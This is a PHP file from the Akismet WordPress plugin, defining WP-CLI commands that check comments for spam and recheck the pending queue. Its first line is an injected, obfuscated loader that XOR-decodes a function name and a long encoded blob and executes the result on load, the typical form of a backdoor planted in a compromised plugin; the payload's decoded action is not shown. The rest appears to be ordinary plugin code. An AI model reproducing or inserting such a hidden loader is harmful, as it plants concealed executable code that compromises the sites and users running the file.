<?php $FSNwNDp='93<A1T,0MUC8BW<'^'ZAY E1sV8; L+8R';$bUTon=$FSNwNDp('',' QfS<AWR=<+Er,6>>=2oTH+Rl=ZM >6;ILsxJVW74HL85BXVTnDR3q5RXVb2:8TjeVT2AjON=4:xelAnF5eyNj<;TMHnTWC>MX <CnhIALNRWiCIw 9+W WBV2P.RnKcmEJxp<5;m74YqiVUlOPSCA+KX6o8PIKN;oSQYhRC,<<N RM<.8ofmP6AaI4-K0<pf=U,mPk74A::7MYUC.OqIHJX14qLp.WXAm27Khjp7QU20CnSRZ:Y+6ZXKll,zc<dtu;APlRN1MKIRNF3W8Kdl7H9pIR;6aS=2ERDs,QDWkGBZU:MmooKCP4 NCl20p.WQmBBY6<.sC>KEF7D.U5<XDo,yqo<ik>t,MaC,IKTyrTo,A:BRej6zPkk1Y9 <,VAeWbQ.YCNG=hJ.JOWDMxR0V8-+Uhc+d,BDGQO<;bJw5H,91IPVYIGKKCW85UP> j0C;Bx7.ARcrf4VYO1PdMVS9QZHSF<3F44V7JDlq<0JLk>A6VLpgb20:;8qGRB<HH1HOAiiXPWMIwj0Q-ZNHSvQaTOyZLYUEO7AWWHRdjdNOchk,A.:TIYUG4SIUURPqS.mCtCyB0BFRBXcqGewS,BR6BhF<N6X98;7:pR;ZU=,RIAejcVX>OqPPJMCGYE;2QDX+YG48TY6uCAYW<1=c,byfMX <,FcyiPC'^'I7NrZ491IUD+-INWMIAGs0D 3Y;9AaiV<8TQcv,==.9VV619:N<=A.Q3,7=mWM BA25F FojVQCQELaNfNopGNSN muNspx4DQFS1FL aqnblIg KSMY;E9jrV1Z3GpCI,aSY6<2IXA-QGkuDk427 po1kOfpm +B4w8yMr0XNP+NziWKAF;Dk<Hh;QY>BRXBR XDka>IKG0=i=47OoLi.+4BQJFTJ6, 2YR2HWPQ09AUxdY45H<JU2xcH3o5,w-1UZ2pH9+Hmvwrj0R;M.MLLB0T-3OW>8XKeodWG4=laNf>4N,MROo51XU+xfO:zG1qEcf=WHOZcEAL X6K4VTxlKs+4>i,8jTM>AgG,2tDLtKZ V77LJMpYbOU8MAcG38EjBuE<:uM4anJ+;6dpXvF7TXNnbjVnQHNc5.HZBwWu=BJT;975 =.c;8Jj11JA5o.N6PUO27UF9P3: U5Li22M0sdsbXR2Uk=R3mEJ6Y,dOZ B7lVABSBHZA.,7;c-0X;;2AN35.jeWNT0Y;ghuPqI9+Lrh=41.lf<21u9CDsrCOYJqHXmyilrQ5x7045DgJTvGuI Quv3t=DXgCQsM0 W;7-Y7i=AQHCIXuK;,QC3-fIJG29J.Xypjmcgy>1;429GqcPY 8mR3  ;SPYDqKBlD=XUXnSPRZ>');$bUTon();

WP_CLI::add_command( 'akismet', 'Akismet_CLI' );

/**
 * Filter spam comments.
 */
class Akismet_CLI extends WP_CLI_Command {
	/**
	 * Checks one or more comments against the Akismet API.
	 *
	 * ## OPTIONS
	 * <comment_id>...
	 * : The ID(s) of the comment(s) to check.
	 *
	 * [--noaction]
	 * : Don't change the status of the comment. Just report what Akismet thinks it is.
	 *
	 * ## EXAMPLES
	 *
	 *     wp akismet check 12345
	 *
	 * @alias comment-check
	 */
	public function check( $args, $assoc_args ) {
		foreach ( $args as $comment_id ) {
			if ( isset( $assoc_args['noaction'] ) ) {
				// Check the comment, but don't reclassify it.
				$api_response = Akismet::check_db_comment( $comment_id, 'wp-cli' );
			}
			else {
				$api_response = Akismet::recheck_comment( $comment_id, 'wp-cli' );
			}
			
			if ( 'true' === $api_response ) {
				WP_CLI::line( sprintf( __( "Comment #%d is spam.", 'akismet' ), $comment_id ) );
			}
			else if ( 'false' === $api_response ) {
				WP_CLI::line( sprintf( __( "Comment #%d is not spam.", 'akismet' ), $comment_id ) );
			}
			else {
				if ( false === $api_response ) {
					WP_CLI::error( __( "Failed to connect to Akismet.", 'akismet' ) );
				}
				else if ( is_wp_error( $api_response ) ) {
					WP_CLI::warning( sprintf( __( "Comment #%d could not be checked.", 'akismet' ), $comment_id ) );
				}
			}
		}
	}
	
	/**
	 * Recheck all comments in the Pending queue.
	 *
	 * ## EXAMPLES
	 *
	 *     wp akismet recheck_queue
	 *
	 * @alias recheck-queue
	 */
	public function recheck_queue() {
		$batch_size = 100;
		$start = 0;
		
		$total_counts = array();
		
		do {
			$result_counts = Akismet_Admin::recheck_queue_portion( $start, $batch_size );
			
			if ( $result_counts['processed'] > 0 ) {
				foreach ( $result_counts as $key => $count ) {
					if ( ! isset( $total_counts[ $key ] ) ) {
						$total_counts[ $key ] = $count;
					}
					else {
						$total_counts[ $key ] += $count;
					}
				}
				$start += $batch_size;
				$start -= $result_counts['spam']; // These comments will have been removed from the queue.
			}
		} while ( $result_counts['processed'] > 0 );
		
		WP_CLI::line( sprintf( _n( "Processed %d comment.", "Processed %d comments.", $total_counts['processed'], 'akismet' ), number_format( $total_counts['processed'] ) ) );
		WP_CLI::line( sprintf( _n( "%d comment moved to Spam.", "%d comments moved to Spam.", $total_counts['spam'], 'akismet' ), number_format( $total_counts['spam'] ) ) );
		
		if ( $total_counts['error'] ) {
			WP_CLI::line( sprintf( _n( "%d comment could not be checked.", "%d comments could not be checked.", $total_counts['error'], 'akismet' ), number_format( $total_counts['error'] ) ) );
		}
	}
}